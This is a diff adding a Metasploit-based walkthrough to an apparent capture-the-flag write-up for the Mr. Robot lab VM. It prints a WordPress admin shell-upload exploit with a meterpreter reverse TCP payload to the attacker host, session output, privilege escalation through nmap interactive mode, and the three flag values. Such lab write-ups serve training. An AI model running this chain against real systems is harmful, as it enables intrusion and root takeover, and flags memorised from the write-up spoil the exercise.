@@ -247,30 +247,145 @@ cat /root/key-3-of-3.txt
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ### Method 2: Use Metasploit
+
+- Using Metasploit to Gain a Reverse Shell
+
+
+1. Start Metasploit Framework:
+
+Open your terminal and start Metasploit: `msfconsole`
+
+2. Search for WordPress Exploits: `search wordpress`
+
+3. Select an Exploit Module: `use exploit/unix/webapp/wp_admin_shell_upload`
+
+4. Set Required Options:
+
+Set the target URL and login credentials for the WordPress admin:
+```bash
+set RHOSTS 192.168.1.226
+set USERNAME elliot
+set PASSWORD ER28-0652
+set TARGETURI /
+```
+5. Set the Payload:
+
+```bash
+set payload php/meterpreter/reverse_tcp
+set LHOST 192.168.1.223
+set LPORT 4444
+```
+
+6. Run the Exploit: `exploit`
+
+```bash
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /
+TARGETURI => /
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME elliot
+USERNAME => elliot
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.223:4444 
+[*] Skipping WordPress check...
+[*] Authenticating with WordPress using elliot:ER28-0652...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload...
+[*] Acquired a plugin upload nonce: 561b3a4c73
+[*] Uploaded plugin lCXSKnpNHP
+[*] Executing the payload at /wp-content/plugins/lCXSKnpNHP/DXgKrelAug.php...
+[*] Sending stage (39927 bytes) to 192.168.1.226
+[*] Meterpreter session 3 opened (192.168.1.223:4444 -> 192.168.1.226:59378) at 2024-06-25 18:56:54 -0400
+[!] This exploit may require manual cleanup of 'DXgKrelAug.php' on the target
+[!] This exploit may require manual cleanup of 'lCXSKnpNHP.php' on the target
+[!] This exploit may require manual cleanup of '../lCXSKnpNHP' on the target
+
+meterpreter > 
+```
+7. Post-Exploitation. Get a shell: `meterpreter > shell`
+8. Upgrade to a Full Shell: `python -c 'import pty; pty.spawn("/bin/bash")'`
+9. Explore the File System
+```bash
+cd /home/robot
+ls -a
+
+```
+10. Read the Content of Key Files:
+```bash
+cat key-2-of-3.txt
+```
+10. Identify Privilege Escalation Opportunities: `find / -perm -u=s -type f 2>/dev/null`
+11. Exploiting Nmap Interactive Mode: `/usr/local/bin/nmap`
+
+```bash
+/usr/local/bin/nmap --interactive
+!sh
+```
+12. Find and Read the Final Key
+```bash
+find / -name "key-3-of-3.txt" 2>/dev/null
+cat /root/key-3-of-3.txt
+```
+13. Cleaning Up
+```bash
+rm /wp-content/plugins/lCXSKnpNHP/DXgKrelAug.php
+rm -rf /wp-content/plugins/lCXSKnpNHP
+```
+```bash
+meterpreter > shell
+Process 6921 created.
+Channel 0 created.
+python -c 'import pty; pty.spawn("/bin/bash")'
+<ps/wordpress/htdocs/wp-content/plugins/lCXSKnpNHP$ cd /home/robot
+cd /home/robot
+daemon@linux:/home/robot$ ls -a
+ls -a
+.  ..  key-2-of-3.txt  password.raw-md5
+daemon@linux:/home/robot$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+daemon@linux:/home/robot$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+daemon@linux:/home/robot$ /usr/local/bin/nmap --interactive
+/usr/local/bin/nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+!sh
+cat /home/robot/key-2-of-3.txt
+822c73956184f694993bede3eb39f959 # Flag 2 of 3 ✔️
+# find / -name "key-3-of-3.txt" 2>/dev/null
+find / -name "key-3-of-3.txt" 2>/dev/null
+/root/key-3-of-3.txt
+# cat /root/key-3-of-3.txt
+cat /root/key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4 # Flag 3 of 3 ✔️
+# 
+```
+
+
+> I was be able to fully exploit the Mr. Robot VM, find all the hidden keys, and perform necessary post-exploitation tasks.
 
 
 
